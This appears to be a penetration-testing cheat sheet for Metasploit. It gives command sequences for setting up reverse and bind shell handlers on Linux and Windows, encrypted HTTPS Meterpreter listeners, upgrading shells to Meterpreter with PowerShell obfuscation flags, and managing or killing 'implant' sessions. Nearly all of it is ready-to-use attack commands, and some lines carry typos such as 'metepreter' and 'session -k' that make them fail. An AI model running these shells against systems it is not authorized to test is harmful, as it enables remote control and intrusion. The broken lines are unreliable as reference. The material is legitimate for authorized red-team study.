---
author(s):
  - Userware
tags:
  - metasploit-framework
  - command-and-control
  - living-off-the-land
---
# Metasploit

> [!NOTE]
>  You can use regular one-liners or create your own custom regular payloads. So use it more often. Further more, you can use the [[Resource|meta shell's]] `resource` to automate commands in a faster pace.

## 01 - Multi Handler

### 1.1 - TCP

#### 1.1.1 - Reverse Callback

##### 1.1.1.1 - Cross Platform

```
msf > use exploit/multi/handler
set payload generic/shell_reverse_tcp
set lhost <IP>
set lport <PORT>
run -j
```

##### 1.1.1.2 - Linux

```
msf > use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set lhost <IP>
set lport <PORT>
run -j
```

##### 1.1.1.3 - Windows

```
msf > use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set lhost <IP>
set lport <PORT>
run -j
```

#### 1.1.2 - Bind Callback

##### 1.1.2.1 - Cross Platform

```
msf > use exploit/multi/handler
set payload generic/shell_bind_tcp
set rhost <target_IP>
run -j
```

##### 1.1.2.2 - Linux

```
msf > use exploit/multi/handler
set payload linux/x64/shell_bind_tcp
set rhost <target_IP>
set lport <PORT>
run -j
```

##### 1.1.2.3 - Windows

```
msf > use exploit/multi/handler
set payload windows/x64/shell_bind_tcp
set rhost <target_IP>
set lport <PORT>
run -j
```

### 1.2 - Setting up a Windows HTTP listener

#### 1.2.1 - Linux

```rb
<ruby>
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_https
set HandlerSSLCert /path/to/certificate.pem
set StagerVerifySSLCert true
set EnableStageEncoding true
set LHOST <attacker_IP>
set LPORT <attacker_PORT>
set ExitOnSession false
run -j
<ruby>
```

#### 1.2.2 - Windows

```rb
<ruby>
use exploit/multi/handler
set payload windows/x64/metepreter/reverse_https
set HandlerSSLCert /path/to/certificate.pem
set StagerVerifySSLCert true
set EnableStageEncoding true
set LHOST <attacker_IP>
set LPORT <attacker_PORT>
set ExitOnSession false
run -j
<ruby>
```

Using bind configuration if port forwarding from an SSH server.

```rb
<ruby>
use exploit/multi/handler
set payload <payload_module>
set HandlerSSLCert /path/to/certificate.pem
set StagerVerifySSLCert true
set EnableStageEncoding true
set LHOST <attacker_IP>
set LPORT <attacker_PORT>
set ReverseListenerBindAddress 127.0.0.1
set ReverseListenerBindPort 4444
set ExitOnSession false
run -j
<ruby>
```

## 03 - List Implants

```
msf > sessions -l
```

List implants with verbose.

```
msf > sessions -v
```

## 04 - Switch Interactive Implants

### 4.1 - Metepreter

```
msf > sessions <session_ID>
```

### 4.2 - Meta Shell

```
sessions <session_ID>
```

## 05 - Upgrade to Meterpreter Session

### 5.1 - Cross Platform

```
msf > sessions -u <session_ID>
```

### 5.2 - Windows

Another benefit is by converting regular shells to `meterpreter` whenever in various circumstances that you might need it.

```
msf > use post/multi/manage/shell_to_meterpreter

msf post(multi/manage/shell) > set win_transfer <powershell | vbs>

msf post(multi/manage/shell) > set payload_override windows/meterpreter/reverse_tcp

msf post(multi/manage/shell) > run session=<session_ID> platform_override=windows psh_arch_override=x64 Powershell::Post::force_wow64=true Powershell::exec_rc4=true Powershell::strip_whitespace=true Powershell::sub_funcs=true
```

## 06 - Workspace

Add new workspace.

```
msf > workspace -a new_workspace
[*] Added workspace: new_workspace
[*] Workspace: new_workspace
```

Rename workspace.

```
msf > workspace -r default renamed_workspace
[*] Renamed workspace 'default' to 'renamed_workspace'
```

List available workspaces.

```
msf > workspace [-l]
default
new_workspace
renamed_workspace
```

Search a specific workspace names.

```
msf > workspace -s <workspace>
```

Delete a specific workspace.

```
msf > workspace -d <workspace>
```

Delete all workspaces.

```
msf > workspace -D <workspace>
```

## 07 - Export Database

```
msf > db_export -f <xml | pwdump> output.<xml | pwdump>
```

^1329b2

## 08 - Detach Implant

> [!INFO]
> This feature only works for HTTP and HTTPS listeners.

```
meterpreter > detach
```

## 09 - Terminate Implant

Terminate current implant.

```
meterpreter > quit

meterpreter > exit
```

Terminate specific implant.

```
msf > session -k <session_ID>
```

Terminate all implants.

```
msf > sessions -K
```

---
## References

### Rapid7

- [Rapid7: Metasploit Framework - Upgrading shells to Metepreter](https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html)

### Hacking Articles

- [Hacking Articles: How to Upgrade Command Shell to Meterpreter](https://www.hackingarticles.in/command-shell-to-meterpreter/)

- [Hacking Articles: Metasploit for Pentester Database Workspace](https://www.hackingarticles.in/metasploit-for-pentester-database-workspace/)